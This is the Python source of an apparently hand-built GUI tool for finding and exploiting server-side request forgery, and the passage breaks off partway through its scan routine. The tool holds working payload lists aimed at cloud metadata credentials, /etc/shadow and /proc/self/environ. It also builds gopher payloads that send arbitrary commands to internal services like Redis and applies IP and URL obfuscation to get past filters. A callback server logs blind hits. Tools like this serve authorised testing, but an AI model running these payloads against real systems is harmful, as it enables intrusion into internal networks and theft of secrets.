import http.server
import socketserver
import threading
import requests
import sys
import argparse
import datetime
import uuid
from urllib.parse import urlparse, parse_qs, quote
import queue
import time
import json
import csv
import re
import ipaddress
import tkinter as tk # Import Tkinter
from tkinter import ttk, scrolledtext, messagebox, filedialog # Import necessary Tkinter modules
import logging # Import logging for better error handling in GUI

# Configure logging to capture output from the server thread
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Shared Data Structure for Communication ---
request_queue = queue.Queue()
request_received_event = threading.Event()
stop_server_event = threading.Event() # Event to signal the server to stop

# --- Store Mapping of Unique IDs to Payloads ---
unique_id_to_payload = {}
unique_id_lock = threading.Lock()

# --- Controlled Target Components ---
class RequestLoggingHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Redirect log messages to logging instead of stdout
        logging.info(format % args)

    def handle_request(self, method):
        client_ip = self.client_address[0]
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        request_line = f"{method} {self.path} {self.request_version}"

        logging.info(f"\n[{timestamp}] [*] Controlled target received {method} request from: {client_ip}")
        logging.info(f"    Request Line: {request_line}")

        logging.info("    Headers:")
        headers_dict = dict(self.headers)
        for header, value in headers_dict.items():
            logging.info(f"        {header}: {value}")

        request_body = None
        if method in ["POST", "PUT", "PATCH"]:
            try:
                content_length = int(self.headers['Content-Length'])
                request_body_bytes = self.rfile.read(content_length)
                request_body = request_body_bytes.decode('utf-8', errors='ignore')
                logging.info(f"    Body: {request_body}")
            except (KeyError, ValueError):
                logging.warning("    Body: (Could not read body - missing or invalid Content-Length)")

        parsed_url = urlparse(self.path)
        path_segments = parsed_url.path.split('/')
        query_params = parse_qs(parsed_url.query)

        unique_id = None
        for segment in path_segments:
            try:
                with unique_id_lock:
                    if segment in unique_id_to_payload:
                        uuid.UUID(segment)
                        unique_id = segment
                        break
            except ValueError:
                pass

        if unique_id is None and 'id' in query_params and query_params['id']:
             potential_id = query_params['id'][0]
             with unique_id_lock:
                 if potential_id in unique_id_to_payload:
                      unique_id = potential_id


        if unique_id:
            logging.info(f"    Detected Unique Identifier: {unique_id}")
        else:
            logging.info("    No Unique Identifier Detected")

        request_info = {
            "timestamp": timestamp,
            "client_ip": client_ip,
            "method": method,
            "path": self.path,
            "headers": headers_dict,
            "body": request_body,
            "unique_id": unique_id
        }
        request_queue.put(request_info)
        request_received_event.set()

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"SSRF Test - Request Received!")


    def do_GET(self):
        self.handle_request("GET")

    def do_POST(self):
        self.handle_request("POST")

    def do_HEAD(self):
        self.handle_request("HEAD")
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_PUT(self):
        self.handle_request("PUT")

    def do_DELETE(self):
        self.handle_request("DELETE")

    def do_PATCH(self):
        self.handle_request("PATCH")


def run_controlled_target(port=8080):
    """Runs a simple HTTP server to act as the controlled target."""
    handler = RequestLoggingHandler
    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("", port), handler)
        logging.info(f"[*] Controlled target listening on port {port}")
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        # Keep the main thread alive while the server thread is running
        # In a GUI context, the Tkinter mainloop will handle this.
        # We need a way to signal the server to stop when the GUI closes.
        # The stop_server_event will be used for this.

        # We can also add a periodic check in the main thread to process the queue
        # while the GUI is running. This is better than a long sleep.
        return httpd
    except Exception as e:
        logging.error(f"[-] Error starting controlled target on port {port}: {e}")
        return None

# --- Request Crafting and Sending Component ---
def test_ssrf_vulnerability(target_url, param_name, payload_obj, method="GET", retries=0, delay=0, proxies=None):
    """
    Tests a target URL for SSRF vulnerability by injecting a payload URL
    into the specified parameter using a given HTTP method, with optional retries and proxy.
    Analyzes the target application's response for indicators of SSRF success/failure.

    Args:
        target_url (str): The URL of the target application.
        param_name (str): The name of the parameter to test.
        payload_obj (dict): Dictionary containing payload info (type, url, etc.).
        method (str): The HTTP method to use (e.g., "GET", "POST").
        retries (int): Number of retries for the request.
        delay (int): Delay in seconds between retries.
        proxies (dict): Dictionary of proxies to use.

    Returns:
        dict or None: A dictionary with analysis results if potential SSRF is detected
                      based on the target's response, otherwise None.
    """
    payload_url = payload_obj["url"]
    payload_type = payload_obj.get("type", "unknown")

    logging.info(f"[*] Testing payload: {payload_url} on parameter '{param_name}' using method {method}")

    attempt = 0
    while attempt <= retries:
        try:
            if method.upper() == "GET":
                if '?' in target_url:
                    full_test_url = f"{target_url}&{param_name}={payload_url}"
                else:
                    full_test_url = f"{target_url}?{param_name}={payload_url}"
                response = requests.get(full_test_url, timeout=5, proxies=proxies)

            elif method.upper() == "POST":
                data = {param_name: payload_url}
                response = requests.post(target_url, data=data, timeout=5, proxies=proxies)

            elif method.upper() == "PUT":
                 data = {param_name: payload_url}
                 response = requests.put(target_url, data=data, timeout=5, proxies=proxies)

            elif method.upper() == "HEAD":
                 if '?' in target_url:
                     full_test_url = f"{target_url}&{param_name}={payload_url}"
                 else:
                     full_test_url = f"{target_url}?{param_name}={payload_url}"
                 response = requests.head(full_test_url, timeout=5, proxies=proxies)

            else:
                logging.warning(f"[-] Unsupported HTTP method: {method}. Skipping.")
                return None

            # --- Analyze Target Application's Response ---
            analysis_finding = None
            if payload_type in ["gopher", "file_access"]:
                 analysis_finding = analyze_target_response(response, payload_obj)
                 if analysis_finding:
                     analysis_finding["target_url"] = target_url
                     analysis_finding["param_name"] = param_name
                     analysis_finding["method_used"] = method
                     return analysis_finding # Return the finding if detected from response

            return None # No finding detected from this request attempt

        except requests.exceptions.Timeout:
            logging.debug(f"[-] Request to target application timed out for payload: {payload_url} (Attempt {attempt + 1}/{retries + 1})")
            pass

        except requests.exceptions.ConnectionError as e:
            logging.debug(f"[-] Connection error to target application for payload {payload_url} (Attempt {attempt + 1}/{retries + 1}): {e}")
            pass

        except requests.exceptions.RequestException as e:
            logging.debug(f"[-] Error sending request to target application for payload {payload_url} (Attempt {attempt + 1}/{retries + 1}): {e}")
            pass

        attempt += 1
        if attempt <= retries:
            time.sleep(delay)

    # If we reach here, all retries failed and no finding was detected from response
    return None

def analyze_target_response(response, payload_obj):
    """
    Analyzes the target application's HTTP response for indicators of SSRF
    success or failure, especially for Gopher and file:// payloads.
    """
    payload_url = payload_obj["url"]
    payload_type = payload_obj.get("type", "unknown")
    response_text = response.text
    status_code = response.status_code

    finding = None

    common_error_patterns = [
        r"connection refused",
        r"connection timed out",
        r"could not connect",
        r"host not found",
        r"no route to host",
        r"Failed to open stream",
        r"Permission denied",
        r"No such file or directory",
    ]

    service_success_patterns = {
        "gopher": [
            r"\+PONG",
            r"OK",
             r"Redis", # Look for Redis banner
             r"SERVER", # Look for Redis INFO output
        ],
        "file_access": [
            r"root:x:",
             r"localhost", # Common in /etc/hosts
             r"nameserver", # Common in /etc/resolv.conf
        ]
    }

    for pattern in common_error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            severity = "Low"
            description = f"Target application attempted to fetch {payload_url} but received a connection/access error. Response contained: '{pattern}'"
            finding = {
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "client_ip": "N/A (from target response)",
                "method": "N/A",
                "path": "N/A",
                "severity": severity,
                "description": description,
                "unique_id_match": False,
                "matched_payload": payload_obj,
                "target_response_status": status_code,
                "target_response_body_snippet": response_text[:500] # Increased snippet size
            }
            logging.info(f"[!] Potential SSRF (Error) detected from target response: {description}")
            return finding

    if payload_type in service_success_patterns:
        for pattern in service_success_patterns[payload_type]:
            if re.search(pattern, response_text, re.IGNORECASE):
                severity = "High"
                if payload_type == "gopher":
                    description = f"Possible Gopher SSRF detected! Target application successfully interacted with {payload_obj.get('target_ip')}:{payload_obj.get('target_port')} using Gopher. Response contained: '{pattern}'"
                    severity = "High"
                elif payload_type == "file_access":
                    description = f"Possible File Access SSRF detected! Target application successfully accessed local file: {payload_url}. Response contained: '{pattern}'"
                    severity = "Critical"

                finding = {
                    "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "client_ip": "N/A (from target response)",
                    "method": "N/A",
                    "path": "N/A",
                    "severity": severity,
                    "description": description,
                    "unique_id_match": False,
                    "matched_payload": payload_obj,
                    "target_response_status": status_code,
                    "target_response_body_snippet": response_text[:500]
                }
                logging.warning(f"[!!!] Potential SSRF (Success) detected from target response: {description}")
                return finding

    return None

# --- Payload Generation ---
def generate_internal_ip_payloads(ports):
    """Generates payloads for common internal IP addresses and specified ports."""
    internal_ips = [
        "127.0.0.1",
        "localhost",
        "10.0.0.1",
        "10.0.0.254",
        "172.16.0.1",
        "172.31.255.254",
        "192.168.1.1",
        "192.168.0.1",
    ]
    payloads = []
    for ip in internal_ips:
        for port in ports:
            payloads.append(f"http://{ip}:{port}")
            payloads.append(f"https://{ip}:{port}")
    return payloads

def generate_cloud_metadata_payloads():
    """Generates payloads for common cloud metadata endpoints."""
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&wait_for_change=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text",
    ]
    return payloads

def generate_file_access_payloads():
    """Generates payloads for common file access attempts."""
    payloads = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hostname",
        "file:///etc/resolv.conf",
        "file:///etc/hosts",
        "file:///proc/self/cmdline",
        "file:///proc/self/environ",
        "file:///proc/self/cwd/",
        "file:///proc/self/fd/0",
    ]
    return payloads

def encode_gopher_payload(payload):
    """URL-encodes a payload for use in a Gopher URL."""
    encoded_payload = quote(payload, safe='')
    encoded_payload = encoded_payload.replace('%0A', '%0d%0a')
    encoded_payload = encoded_payload.replace('%0D%0A', '%0d%0a')
    return encoded_payload

def generate_gopher_payloads(target_ip, target_port, commands):
    """
    Generates Gopher payloads to interact with an internal service.
    """
    payloads = []
    combined_commands = "\r\n".join(commands) + "\r\n"
    encoded_commands = encode_gopher_payload(combined_commands)
    gopher_url = f"gopher://{target_ip}:{target_port}/_{encoded_commands}"
    payloads.append(gopher_url)
    return payloads

def int_to_ipv4(ip_int):
    """Converts an integer to an IPv4 dotted-decimal string."""
    return str(ipaddress.IPv4Address(ip_int))

def apply_encoding_techniques(payload_url, techniques):
    """
    Applies various URL encoding and obfuscation techniques to a payload URL.
    """
    encoded_payloads = [payload_url]

    parsed_url = urlparse(payload_url)
    scheme = parsed_url.scheme
    netloc = parsed_url.netloc
    path = parsed_url.path
    query = parsed_url.query
    fragment = parsed_url.fragment

    host = netloc.split(':')[0] if ':' in netloc else netloc
    port = netloc.split(':')[1] if ':' in netloc else None

    if "url_encode" in techniques:
        encoded_part = quote(f"{path}?{query}#{fragment}" if query or fragment else path, safe='')
        encoded_url = f"{scheme}://{netloc}{encoded_part}"
        encoded_payloads.append(encoded_url)

    if "double_encode" in techniques:
        encoded_part = quote(f"{path}?{query}#{fragment}" if query or fragment else path, safe='')
        double_encoded_part = quote(encoded_part, safe='')
        double_encoded_url = f"{scheme}://{netloc}{double_encoded_part}"
        encoded_payloads.append(double_encoded_url)

    if "ip_int" in techniques:
        try:
            ip_address = ipaddress.IPv4Address(host)
            ip_int = int(ip_address)
            encoded_host = str(ip_int)
            encoded_netloc = f"{encoded_host}:{port}" if port else encoded_host
            encoded_url = f"{scheme}://{encoded_netloc}{path}?{query}#{fragment}" if query or fragment else f"{scheme}://{encoded_netloc}{path}"
            encoded_payloads.append(encoded_url)
        except (ipaddress.AddressValueError, ValueError):
            pass

    if "ip_hex" in techniques:
        try:
            ip_address = ipaddress.IPv4Address(host)
            ip_hex = hex(int(ip_address))
            encoded_host = ip_hex
            encoded_netloc = f"{encoded_host}:{port}" if port else encoded_host
            encoded_url = f"{scheme}://{encoded_netloc}{path}?{query}#{fragment}" if query or fragment else f"{scheme}://{encoded_netloc}{path}"
            encoded_payloads.append(encoded_url)
        except (ipaddress.AddressValueError, ValueError):
            pass

    if "ip_octal" in techniques:
        try:
            ip_address = ipaddress.IPv4Address(host)
            octal_parts = [oct(part)[2:] for part in ip_address.packed]
            encoded_host = ".".join(octal_parts)
            encoded_netloc = f"{encoded_host}:{port}" if port else encoded_host
            encoded_url = f"{scheme}://{encoded_netloc}{path}?{query}#{fragment}" if query or fragment else f"{scheme}://{encoded_netloc}{path}"
            encoded_payloads.append(encoded_url)
        except (ipaddress.AddressValueError, ValueError):
            pass

    if "null_byte" in techniques:
        encoded_netloc_with_null = f"{netloc}%00"
        encoded_url_with_null = f"{scheme}://{encoded_netloc_with_null}{path}?{query}#{fragment}" if query or fragment else f"{scheme}://{encoded_netloc_with_null}{path}"
        encoded_payloads.append(encoded_url_with_null)

        encoded_path_with_null = f"{path}%00"
        encoded_url_with_null_path = f"{scheme}://{netloc}{encoded_path_with_null}?{query}#{fragment}" if query or fragment else f"{scheme}://{netloc}{encoded_path_with_null}"
        encoded_payloads.append(encoded_url_with_null_path)


    return list(set(encoded_payloads))


# --- Analysis and Reporting ---
def analyze_request(request_info):
    """
    Analyzes a received request on the controlled target and determines if it indicates SSRF,
    using the unique ID to look up the original payload.
    """
    client_ip = request_info["client_ip"]
    path = request_info["path"]
    received_unique_id = request_info["unique_id"]

    severity = "Low"
    description = "Controlled target accessed."
    matched_payload_info = None

    if received_unique_id:
        with unique_id_lock:
            if received_unique_id in unique_id_to_payload:
                matched_payload_info = unique_id_to_payload[received_unique_id]

    if matched_payload_info:
         payload_type = matched_payload_info.get("type", "unknown")
         original_payload_url = matched_payload_info.get("url", "N/A")

         description = f"Target application fetched: {original_payload_url}"

         if payload_type == "internal":
             severity = "High"
             description = f"Internal resource accessed: {original_payload_url}"
         elif payload_type == "cloud_metadata":
             severity = "Critical"
             description = f"Cloud metadata endpoint accessed: {original_payload_url}"
         elif payload_type == "file_access":
             severity = "Critical"
             description = f"Local file accessed: {original_payload_url}"
         elif payload_type == "gopher":
             severity = "High"
             description = f"Gopher interaction attempted with internal service: {original_payload_url}"
         elif payload_type == "controlled":
             severity = "Low"
             description = f"Controlled target accessed: {original_payload_url}"


         if received_unique_id:
             severity = "High" if severity == "Low" else severity
             description = f"Possible Blind SSRF detected. Controlled target received request from {client_ip} with ID: {received_unique_id}. Original payload type: {payload_type}. Original Payload: {original_payload_url}"

    finding = {
        "timestamp": request_info["timestamp"],
        "client_ip": client_ip,
        "method": request_info["method"],
        "path": path,
        "severity": severity,
        "description": description,
        "unique_id_match": bool(received_unique_id),
        "matched_payload": matched_payload_info
    }
    logging.warning(f"[!!!] Potential SSRF (Controlled Target) detected: {description}")
    return finding

def report_findings(findings, output_format="text"):
    """Prints or outputs a summary report of the findings."""

    if output_format == "text":
        # Use the scrolled text widget in the GUI for text output
        pass

    elif output_format == "json":
        return json.dumps(findings, indent=4)

    elif output_format == "csv":
        if not findings:
            return "No potential SSRF vulnerabilities detected for CSV output."

        fieldnames = [
            "timestamp",
            "client_ip",
            "method_controlled_target",
            "path_to_controlled_target",
            "severity",
            "description",
            "unique_id_match",
            "injected_payload_type",
            "injected_payload_url",
            "encoding_techniques_applied",
            "gopher_target_ip",
            "gopher_target_port",
            "gopher_commands",
            "target_url",
            "parameter_name",
            "method_used_on_target",
            "target_response_status",
            "target_response_body_snippet",
        ]

        output = io.StringIO() # Use StringIO to capture CSV output
        writer = csv.DictWriter(output, fieldnames=fieldnames)

        writer.writeheader()
        for finding in findings:
            csv_row = {
                "timestamp": finding["timestamp"],
                "client_ip": finding.get("client_ip", ""),
                "method_controlled_target": finding.get("method", ""),
                "path_to_controlled_target": finding.get("path", "") if finding.get('matched_payload') and finding['matched_payload'].get('type') == 'controlled' else '',
                "severity": finding["severity"],
                "description": finding["description"],
                "unique_id_match": finding["unique_id_match"],
                "injected_payload_type": finding['matched_payload'].get('type', 'unknown') if finding.get('matched_payload') else '',
                "injected_payload_url": finding['matched_payload'].get('url', '') if finding.get('matched_payload') else '',
                "encoding_techniques_applied": ', '.join(finding['matched_payload'].get('encoding_techniques', [])) if finding.get('matched_payload') else '',
                "gopher_target_ip": finding['matched_payload'].get('target_ip', '') if finding.get('matched_payload') and finding['matched_payload'].get('type') == 'gopher' else '',
                "gopher_target_port": finding['matched_payload'].get('target_port', '') if finding.get('matched_payload') and finding['matched_payload'].get('type') == 'gopher' else '',
                "gopher_commands": ', '.join(finding['matched_payload'].get('commands', [])) if finding.get('matched_payload') and finding['matched_payload'].get('type') == 'gopher' else '',
                "target_url": finding.get("target_url", ""),
                "parameter_name": finding.get("param_name", ""),
                "method_used_on_target": finding.get("method_used", ""),
                "target_response_status": finding.get("target_response_status", ""),
                "target_response_body_snippet": finding.get("target_response_body_snippet", ""),
            }
            writer.writerow(csv_row)

        return output.getvalue()

    else:
        return f"[-] Unsupported output format: {output_format}"

# --- GUI Components ---
class SSRFGui:
    def __init__(self, master):
        self.master = master
        master.title("SSRF Vulnerability Tester")

        self.controlled_server = None
        self.all_findings = []

        # Use a separate queue for GUI updates
        self.gui_update_queue = queue.Queue()

        # Create Notebook for different sections
        self.notebook = ttk.Notebook(master)
        self.notebook.pack(pady=10, padx=10, fill="both", expand=True)

        # Target and Controlled Target Tab
        self.target_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.target_frame, text="Target & Controlled Target")
        self.setup_target_frame(self.target_frame)

        # Payload Options Tab
        self.payload_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.payload_frame, text="Payload Options")
        self.setup_payload_frame(self.payload_frame)

        # Encoding and Advanced Options Tab
        self.advanced_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.advanced_frame, text="Advanced Options")
        self.setup_advanced_frame(self.advanced_frame)

        # Results Tab
        self.results_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.results_frame, text="Results")
        self.setup_results_frame(self.results_frame)

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_bar = ttk.Label(master, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        self.update_status("Ready")

        # Process updates from the queue periodically
        self.master.after(100, self.process_gui_updates)

        # Handle window closing
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)


    def setup_target_frame(self, frame):
        ttk.Label(frame, text="Target Application URL:").grid(row=0, column=0, sticky=tk.W, pady=5, padx=5)
        self.target_url_entry = ttk.Entry(frame, width=50)
        self.target_url_entry.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Parameter(s) to Test (comma-separated):").grid(row=1, column=0, sticky=tk.W, pady=5, padx=5)
        self.parameter_entry = ttk.Entry(frame, width=50)
        self.parameter_entry.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Controlled Target IP:").grid(row=2, column=0, sticky=tk.W, pady=5, padx=5)
        self.controlled_ip_entry = ttk.Entry(frame, width=50)
        self.controlled_ip_entry.grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Controlled Target Port:").grid(row=3, column=0, sticky=tk.W, pady=5, padx=5)
        self.controlled_port_entry = ttk.Entry(frame, width=10)
        self.controlled_port_entry.insert(0, "8080")
        self.controlled_port_entry.grid(row=3, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="HTTP Method(s) (comma-separated):").grid(row=4, column=0, sticky=tk.W, pady=5, padx=5)
        self.method_entry = ttk.Entry(frame, width=20)
        self.method_entry.insert(0, "GET")
        self.method_entry.grid(row=4, column=1, sticky=tk.W, pady=5, padx=5)

        # Start Scan Button
        self.start_button = ttk.Button(frame, text="Start Scan", command=self.start_scan)
        self.start_button.grid(row=5, column=0, columnspan=2, pady=20)

    def setup_payload_frame(self, frame):
        ttk.Label(frame, text="Payload Options:").grid(row=0, column=0, sticky=tk.W, pady=5, padx=5)

        self.test_controlled_var = tk.BooleanVar()
        self.test_controlled_check = ttk.Checkbutton(frame, text="Test Controlled Target", variable=self.test_controlled_var)
        self.test_controlled_check.grid(row=1, column=0, sticky=tk.W, padx=15)

        self.generate_id_var = tk.BooleanVar()
        self.generate_id_check = ttk.Checkbutton(frame, text="Generate Unique ID (for Blind SSRF)", variable=self.generate_id_var)
        self.generate_id_check.grid(row=1, column=1, sticky=tk.W, padx=15)

        self.test_internal_var = tk.BooleanVar()
        self.test_internal_check = ttk.Checkbutton(frame, text="Test Common Internal IPs", variable=self.test_internal_var)
        self.test_internal_check.grid(row=2, column=0, sticky=tk.W, padx=15)

        ttk.Label(frame, text="Internal Ports (comma-separated):").grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)
        self.internal_ports_entry = ttk.Entry(frame, width=30)
        self.internal_ports_entry.insert(0, "80,443,8080")
        self.internal_ports_entry.grid(row=2, column=2, sticky=tk.W, pady=5, padx=5)

        self.test_cloud_var = tk.BooleanVar()
        self.test_cloud_check = ttk.Checkbutton(frame, text="Test Cloud Metadata Endpoints", variable=self.test_cloud_var)
        self.test_cloud_check.grid(row=3, column=0, sticky=tk.W, padx=15)

        self.test_file_var = tk.BooleanVar()
        self.test_file_check = ttk.Checkbutton(frame, text="Test Common File Access (file://)", variable=self.test_file_var)
        self.test_file_check.grid(row=4, column=0, sticky=tk.W, padx=15)

        self.test_gopher_var = tk.BooleanVar()
        self.test_gopher_check = ttk.Checkbutton(frame, text="Test Gopher Payloads", variable=self.test_gopher_var)
        self.test_gopher_check.grid(row=5, column=0, sticky=tk.W, padx=15)

        ttk.Label(frame, text="Gopher Target IP:").grid(row=5, column=1, sticky=tk.W, pady=5, padx=5)
        self.gopher_ip_entry = ttk.Entry(frame, width=20)
        self.gopher_ip_entry.grid(row=5, column=2, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Gopher Target Port:").grid(row=6, column=1, sticky=tk.W, pady=5, padx=5)
        self.gopher_port_entry = ttk.Entry(frame, width=10)
        self.gopher_port_entry.grid(row=6, column=2, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Gopher Commands (comma-separated):").grid(row=7, column=1, sticky=tk.W, pady=5, padx=5)
        self.gopher_commands_entry = ttk.Entry(frame, width=30)
        self.gopher_commands_entry.grid(row=7, column=2, sticky=tk.W, pady=5, padx=5)


    def setup_advanced_frame(self, frame):
        ttk.Label(frame, text="Encoding Techniques:").grid(row=0, column=0, sticky=tk.W, pady=5, padx=5)

        self.encode_vars = {}
        encoding_options = ["url_encode", "double_encode", "ip_int", "ip_hex", "ip_octal", "null_byte"]
        col = 0
        row = 1
        for option in encoding_options:
            self.encode_vars[option] = tk.BooleanVar()
            chk = ttk.Checkbutton(frame, text=option, variable=self.encode_vars[option])
            chk.grid(row=row, column=col, sticky=tk.W, padx=15)
            col += 1
            if col > 2: # Arrange in columns
                col = 0
                row += 1

        ttk.Label(frame, text="Request Timeout (seconds):").grid(row=row+1, column=0, sticky=tk.W, pady=5, padx=5)
        self.timeout_entry = ttk.Entry(frame, width=10)
        self.timeout_entry.insert(0, "5")
        self.timeout_entry.grid(row=row+1, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Retries:").grid(row=row+2, column=0, sticky=tk.W, pady=5, padx=5)
        self.retries_entry = ttk.Entry(frame, width=10)
        self.retries_entry.insert(0, "0")
        self.retries_entry.grid(row=row+2, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Delay between Retries (seconds):").grid(row=row+3, column=0, sticky=tk.W, pady=5, padx=5)
        self.delay_entry = ttk.Entry(frame, width=10)
        self.delay_entry.insert(0, "1")
        self.delay_entry.grid(row=row+3, column=1, sticky=tk.W, pady=5, padx=5)

        ttk.Label(frame, text="Proxy (e.g., http://127.0.0.1:8080):").grid(row=row+4, column=0, sticky=tk.W, pady=5, padx=5)
        self.proxy_entry = ttk.Entry(frame, width=50)
        self.proxy_entry.grid(row=row+4, column=1, sticky=tk.W, pady=5, padx=5)


    def setup_results_frame(self, frame):
        self.results_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=20)
        self.results_text.pack(pady=10, padx=10, fill="both", expand=True)

        self.save_report_button = ttk.Button(frame, text="Save Report", command=self.save_report)
        self.save_report_button.pack(pady=5)


    def update_status(self, message):
        self.status_var.set(message)
        self.master.update_idletasks() # Update the status bar immediately

    def log_to_gui(self, message):
        # This method will be called by a custom logging handler
        self.gui_update_queue.put(("log", message))

    def add_finding_to_gui(self, finding):
        # Add findings to a list and update the GUI later
        self.gui_update_queue.put(("finding", finding))


    def process_gui_updates(self):
        """Process items in the GUI update queue."""
        while not self.gui_update_queue.empty():
            try:
                update_type, data = self.gui_update_queue.get_nowait()
                if update_type == "log":
                    self.results_text.insert(tk.END, data + "\n")
                    self.results_text.see(tk.END) # Auto-scroll
                elif update_type == "finding":
                    self.all_findings.append(data)
                    # You might want to update the report display dynamically here
                    # For now, the full report is generated at the end.
            except queue.Empty:
                pass
            except Exception as e:
                logging.error(f"Error processing GUI update: {e}")

        # Schedule the next check
        self.master.after(100, self.process_gui_updates)


    def start_scan(self):
        # Clear previous results
        self.results_text.delete(1.0, tk.END)
        self.all_findings = []
        global unique_id_to_payload # Clear the global mapping for a new scan
        with unique_id_lock:
             unique_id_to_payload = {}

        # Get values from GUI inputs
        target_url = self.target_url_entry.get()
        parameters_str = self.parameter_entry.get()
        controlled_ip = self.controlled_ip_entry.get()
        controlled_port_str = self.controlled_port_entry.get()
        methods_str = self.method_entry.get()
        timeout_str = self.timeout_entry.get()
        retries_str = self.retries_entry.get()
        delay_str = self.delay_entry.get()
        proxy_str = self.proxy_entry.get()

        test_controlled = self.test_controlled_var.get()
        generate_id = self.generate_id_var.get()
        test_internal = self.test_internal_var.get()
        internal_ports_str = self.internal_ports_entry.get()
        test_cloud = self.test_cloud_var.get()
        test_file = self.test_file_var.get()
        test_gopher = self.test_gopher_var.get()
        gopher_ip = self.gopher_ip_entry.get()
        gopher_port_str = self.gopher_port_entry.get()
        gopher_commands_str = self.gopher_commands_entry.get()

        selected_encoding_techniques = [tech for tech, var in self.encode_vars.items() if var.get()]


        # Validate inputs
        if not target_url or not parameters_str or not controlled_ip:
            messagebox.showwarning("Input Error", "Target URL, Parameters, and Controlled Target IP are required.")
            return

        try:
            controlled_port = int(controlled_port_str)
            timeout = int(timeout_str)
            retries = int(retries_str)
            delay = int(delay_str)
        except ValueError:
            messagebox.showwarning("Input Error", "Port, Timeout, Retries, and Delay must be integers.")
            return

        parameters = [p.strip() for p in parameters_str.split(',') if p.strip()]
        methods = [m.strip().upper() for m in methods_str.split(',') if m.strip()]

        internal_ports = []
        if test_internal:
            try:
                internal_ports = [int(p.strip()) for p in internal_ports_str.split(',') if p.strip()]
            except ValueError:
                messagebox.showwarning("Input Error", "Internal Ports must be comma-separated integers.")
                return

        gopher_port = None
        gopher_commands = []
        if test_gopher:
             if not gopher_ip or not gopher_port_str or not gopher_commands_str:
                  messagebox.showwarning("Input Error", "Gopher testing requires Target IP, Target Port, and Commands.")
                  return
             try:
                  gopher_port = int(gopher_port_str)
                  gopher_commands = [cmd.strip() for cmd in gopher_commands_str.split(',') if cmd.strip()]
             except ValueError:
                  messagebox.showwarning("Input Error", "Gopher Target Port must be an integer.")
                  return


        # Configure proxy
        request_proxies = None
        if proxy_str:
            try:
                 parsed_proxy = urlparse(proxy_str)
                 if not parsed_proxy.scheme or not parsed_proxy.netloc:
                      raise ValueError("Invalid proxy format")
                 request_proxies = {
                     parsed_proxy.scheme: proxy_str
                 }
                 # Add both http and https if scheme is not specified (common for just host:port)
                 if not parsed_proxy.scheme in ['http', 'https']:
                      request_proxies = {"http": proxy_str, "https": proxy_str}

            except ValueError as e:
                 messagebox.showwarning("Input Error", f"Invalid proxy format: {e}")
                 return


        self.update_status("Starting scan...")
        self.notebook.select(self.results_frame) # Switch to results tab

        # Run the scan in a separate thread to keep the GUI responsive
        scan_thread = threading.Thread(target=self.run_scan, args=(
            target_url, parameters, controlled_ip, controlled_port, methods,
            test_controlled, generate_id, test_internal, internal_ports,
            test_cloud, test_file, test_gopher, gopher_ip, gopher_port, gopher_commands,
            selected_encoding_techniques, timeout, retries, delay, request_proxies
        ))
        scan_thread.start()


    def run_scan(self, target_url, parameters, controlled_ip, controlled_port, methods,
                 test_controlled, generate_id, test_internal, internal_ports,
                 test_cloud, test_file, test_gopher, gopher_ip, gopher_port, gopher_commands,
                 selected_encoding_techniques, timeout, retries, delay, request_proxies):

        try:
            # 1. Start the controlled target server if controlled target testing is requested
            if test_controlled:
                self.controlled_server = run_controlled_target(controlled_port)
                if self.controlled_server is None:
                    self.gui_update_queue.put(("log", "[-] Failed to start controlled target. Scan aborted."))
                    self.update_status("Scan aborted: Failed to start controlled target.")
                    return
                self.gui_update_queue.put(("log", f"[*] Controlled target URL base: http://{controlled_ip}:{controlled_port}/ssrf_test"))


            # 2. Generate unique ID if requested for controlled target
            unique_test_id = None
            controlled_target_url_base = f"http://{controlled_ip}:{controlled_port}"

            if test_controlled and generate_id:
                unique_test_id = str(uuid.uuid4())
                self.gui_update_queue.put(("log", f"[*] Generated unique test ID: {unique_test_id}"))
                controlled_target_url_for_injection = f"{controlled_target_url_base}/ssrf_test/{unique_test_id}"
                self.gui_update_queue.put(("log", f"[*] Controlled target URL with ID for injection: {controlled_target_url_for_injection}"))
            elif test_controlled:
                 controlled_target_url_for_injection = f"{controlled_target_url_base}/ssrf_test"
            else:
                 controlled_target_url_for_injection = None

            # 3. Generate base payloads
            base_payloads = []
            if test_controlled and controlled_target_url_for_injection:
